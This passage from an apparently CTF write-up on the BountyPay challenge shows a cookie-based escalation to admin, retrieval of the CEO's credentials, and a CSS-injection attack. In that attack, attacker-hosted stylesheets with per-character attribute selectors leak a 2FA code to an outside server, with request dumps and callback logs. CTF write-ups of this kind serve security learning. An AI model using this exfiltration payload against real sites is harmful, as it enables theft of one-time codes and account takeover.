Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://staff.bountypay.h1ctf.com//?template[]=login&template[]=home&template[]=ticket&ticket_id=3582&username=sandra.allison
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRC8rV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHb2lxaC9mWlFkZmNpdWZDVmJVNnNLOHFLT0svRkJSY0MwNTcyMEs4c1lyUzE3UT09
Pragma: no-cache
Cache-Control: no-cache
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 01 Jun 2020 04:14:38 GMT
Content-Type: application/json
Connection: close
Set-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRC8rV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hqTzFPaWQ0bDA0M2xZdXozYkJqRURhdXczckZGTWlCSGtVR3lDU3FycUZGUjY0QXNHbzMybnJQZFZkYUIwc3ZpVWJ4VCtLWmZhYS83Q0IwTlNncy93aDZrbFlPTzE3UT09; expires=Fri, 03-Jul-2020 04:14:38 GMT; Max-Age=2592000; path=/
Content-Length: 19

["Report received"]
```

The response contained a new cookie with Admin permissions. With those permissions I was able to retrieve the CEO's username and password:

{F853773}


# Taking over the CEO's account and making the payments

Using Marten's credentials I was able to log in to his account. I had to bypass the 2FA the exact same way I did for Brian Oliver at the very beginning. Once I was logged in I checked all the dates for pending transaction. I saw that 1 transaction in May 2020 was waiting to be processed:

{F853795}

I clicked on the *Pay* button, but the payment process was protected by 2FA. This time the 2FA system seemed to be a bit different than the one used for the login process:

{F853781}

{F853782}

I checked the requests in Burp Suite and found something interesting in the POST request that sends the payment challenge to the 2FA app:

```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
Upgrade-Insecure-Requests: 1

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

I checked the content of the css file that `app_style` parameter was referring to and saw this:

```css
/**
Template for the UNI 2FA App
 */

body {
    background-color: #FFFFFF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-image:url("https://www.bountypay.h1ctf.com/images/bountypay.png");
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}
```

From that. I made the following assumptions:

- The 2FA system uses a *UNI 2FA App*
- It's possible to define the css the app will use when requesting the code
- The code length is 7 chars max. (I got this information from the HTML in the 2FA page)

I changed the css URL in the request for a URL that points to one of my servers and noticed that the file was actually fetched:

```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
Upgrade-Insecure-Requests: 1

app_style=https://foo.x.0xcc.ovh/test.css
```

```
3.21.98.146 - - [02/Jun/2020:12:38:14 +0000] "GET /test.css HTTP/2.0" 200 46102 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
```

At that point I knew I could try data exfiltration via CSS injection. You can read more about this technique [here](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d) First I tried with a very simple CSS file, to validate the exfiltration would actually work:

```css
input {background-image:url("https://foo.x.0xcc.ovh/input.jpg");}
```

I re-sent the POST request above and got a callback to my server, awesome! I then generated a CSS with selectors for all printable ASCII chars:

```css
input[value^="0"] {background-image:url("https://foo.x.0xcc.ovh/0.jpg");}
input[value^="1"] {background-image:url("https://foo.x.0xcc.ovh/1.jpg");}
input[value^="2"] {background-image:url("https://foo.x.0xcc.ovh/2.jpg");}
...
```

It still seemed to work, I got callbacks. I tried again with 2 chars selectors:

```css
input[value^="00"] {background-image:url("https://foo.x.0xcc.ovh/00.jpg");}
input[value^="01"] {background-image:url("https://foo.x.0xcc.ovh/01.jpg");}
input[value^="02"] {background-image:url("https://foo.x.0xcc.ovh/02.jpg");}
...
```

And, nothing! After playing around a bit, I figured out the app must probably use one input field for each character. I generated a CSS file to take this into account:

```css
input[value^="0"]:nth-child(1) {background-image:url("https://foo.x.0xcc.ovh/1_0.jpg");}
input[value^="1"]:nth-child(1) {background-image:url("https://foo.x.0xcc.ovh/1_1.jpg");}
input[value^="2"]:nth-child(1) {background-image:url("https://foo.x.0xcc.ovh/1_2.jpg");}
...
input[value^="0"]:nth-child(2) {background-image:url("https://foo.x.0xcc.ovh/2_0.jpg");}
input[value^="1"]:nth-child(2) {background-image:url("https://foo.x.0xcc.ovh/2_1.jpg");}
input[value^="2"]:nth-child(2) {background-image:url("https://foo.x.0xcc.ovh/2_2.jpg");}
...
...
input[value^="x"]:nth-child(7) {background-image:url("https://foo.x.0xcc.ovh/7_x.jpg");}
input[value^="y"]:nth-child(7) {background-image:url("https://foo.x.0xcc.ovh/7_y.jpg");}
input[value^="z"]:nth-child(7) {background-image:url("https://foo.x.0xcc.ovh/7_z.jpg");}
```

I re-sent the POST request and bingo!

```
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /test.css HTTP/2.0" 200 46102 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /1_a.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /2_x.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /3_9.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /4_l.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /5_B.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /6_C.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /7_t.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
```

I then entered the 2FA code `ax9lBCt`, and the payment got processed:

 

{F853774}

The flag: ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

## Impact

All hackers are paid!

## Attachments
- admin-creds.png
- 2020-06-02_09-18.png
- app-2fa.png
- avatar.png
- bounty-app-dashboard.png
- call-upgrade.png
- call-upgrade-ok.png
- intellij-classes.png
- payment-2fa.png
- payment-2fa-2.png
- redirect.png
- Screenshot_20200602-132657_BountyPay.jpg
- report.png
- Screenshot_20200602-132808_BountyPay.jpg
- Screenshot_20200602-132859_BountyPay.jpg
- Screenshot_20200602-132915_BountyPay.jpg
- Screenshot_20200602-133014_BountyPay.jpg
- software-401.png
- Screenshot_20200602-134305_BountyPay.jpg
- staff.png
- staff-profile.png
- staff-ticket.png
- transaction.png
- twitter.png
